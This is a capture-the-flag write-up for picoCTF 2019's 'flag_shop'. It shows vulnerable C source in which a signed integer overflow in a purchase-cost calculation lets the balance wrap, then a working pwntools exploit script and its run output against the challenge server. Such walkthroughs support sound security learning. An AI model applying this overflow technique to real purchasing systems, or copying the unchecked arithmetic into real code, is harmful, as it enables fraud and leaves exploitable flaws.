# flag_shop

- [Challenge information](#challenge-information)
- [Solution](#solution)
- [References](#references)

## Challenge information

```text
Level: Medium
Tags: picoCTF 2019, General Skills
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Author: DANNY

Description:
There's a flag shop selling stuff, can you buy a flag? Source. 

Connect with nc jupiter.challenges.picoctf.org 4906.

Hints:
1. Two's compliment can do some weird things when numbers get really big!
```

Challenge link: [https://play.picoctf.org/practice/challenge/49](https://play.picoctf.org/practice/challenge/49)

## Solution

### Analyse the setup

Let's start by checking the C source code

```c
#include <stdio.h>
#include <stdlib.h>
int main()
{
    setbuf(stdout, NULL);
    int con;
    con = 0;
    int account_balance = 1100;
    while(con == 0){
        
        printf("Welcome to the flag exchange\n");
        printf("We sell flags\n");

        printf("\n1. Check Account Balance\n");
        printf("\n2. Buy Flags\n");
        printf("\n3. Exit\n");
        int menu;
        printf("\n Enter a menu selection\n");
        fflush(stdin);
        scanf("%d", &menu);
        if(menu == 1){
            printf("\n\n\n Balance: %d \n\n\n", account_balance);
        }
        else if(menu == 2){
            printf("Currently for sale\n");
            printf("1. Defintely not the flag Flag\n");
            printf("2. 1337 Flag\n");
            int auction_choice;
            fflush(stdin);
            scanf("%d", &auction_choice);
            if(auction_choice == 1){
                printf("These knockoff Flags cost 900 each, enter desired quantity\n");
                
                int number_flags = 0;
                fflush(stdin);
                scanf("%d", &number_flags);
                if(number_flags > 0){
                    int total_cost = 0;
                    total_cost = 900*number_flags;
                    printf("\nThe final cost is: %d\n", total_cost);
                    if(total_cost <= account_balance){
                        account_balance = account_balance - total_cost;
                        printf("\nYour current balance after transaction: %d\n\n", account_balance);
                    }
                    else{
                        printf("Not enough funds to complete purchase\n");
                    }
                }
            }
            else if(auction_choice == 2){
                printf("1337 flags cost 100000 dollars, and we only have 1 in stock\n");
                printf("Enter 1 to buy one");
                int bid = 0;
                fflush(stdin);
                scanf("%d", &bid);
                
                if(bid == 1){
                    
                    if(account_balance > 100000){
                        FILE *f = fopen("flag.txt", "r");
                        if(f == NULL){

                            printf("flag not found: please run this on the server\n");
                            exit(0);
                        }
                        char buf[64];
                        fgets(buf, 63, f);
                        printf("YOUR FLAG IS: %s\n", buf);
                        }
                    
                    else{
                        printf("\nNot enough funds for transaction\n\n\n");
                    }}
            }
        }
        else{
            con = 1;
        }
    }
    return 0;
}
```

Here we should note that the `account_balance` variable is a signed integer rather than an unsigned one. (`int account_balance = 1100;`)  
This means it stores both positive and negative numbers in [two's complement](https://en.wikipedia.org/wiki/Two%27s_complement) format.  

We can exploit this fact by wrapping around the value by doing an expensive purchase.  
The value needs to be larger than `2**31 - 1` for a 32-bit integer.

Each `Defintely not the flag` flag costs `900` and the `1337 Flag` costs 100000. Our start balance is 1100.  
So if we buy `(2**31 - 1 - 1100 + 100000) // 900` flags we ought to wrap around.

### Write a python script

We can use [pwntools](https://docs.pwntools.com/en/stable/index.html) to automate this with a Python script

```python
#!/usr/bin/python

from pwn import *

SERVER = 'jupiter.challenges.picoctf.org'
PORT = 4906

# Set output level (critical, error, warning, info (default), debug)
context.log_level = "info"

io = remote(SERVER, PORT)
# Buy a lot of 'Defintely not the flag' Flags
amount = (2**31 - 1 - 1100 + 100000) // 900
log.info(f"Buying {amount} Defintely not the flag Flags")
io.sendlineafter(b" Enter a menu selection\n", b"2")
io.sendlineafter(b"2. 1337 Flag\n", b"1")
io.sendlineafter(b"These knockoff Flags cost 900 each, enter desired quantity\n", str(amount).encode('ascii'))

# Buy the 1337 flag
log.info(f"Buying 1 1337 Flag")
io.sendlineafter(b" Enter a menu selection\n", b"2")
io.sendlineafter(b"2. 1337 Flag\n", b"2")
io.sendlineafter(b"Enter 1 to buy one", b"1")

# Get the flag
flag = io.recvlineS().strip()
print(flag)
io.close()
```

### Get the flag

Then we run the script to get the flag

```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2019/General_Skills/Flag_shop]
└─$ ~/python_venvs/pwntools/bin/python get_flag.py
[+] Opening connection to jupiter.challenges.picoctf.org on port 4906: Done
[*] Buying 2386202 Defintely not the flag Flags
[*] Buying 1 1337 Flag
YOUR FLAG IS: picoCTF{<REDACTED>}
[*] Closed connection to jupiter.challenges.picoctf.org port 4906
```

For additional information, please see the references below.

## References

- [C (programming language) - Wikipedia](https://en.wikipedia.org/wiki/C_(programming_language))
- [pwntools - Documentation](https://docs.pwntools.com/en/stable/index.html)
- [pwntools - GitHub](https://github.com/Gallopsled/pwntools)
- [Python (programming language) - Wikipedia](https://en.wikipedia.org/wiki/Python_(programming_language))
- [Two's complement - Wikipedia](https://en.wikipedia.org/wiki/Two%27s_complement)
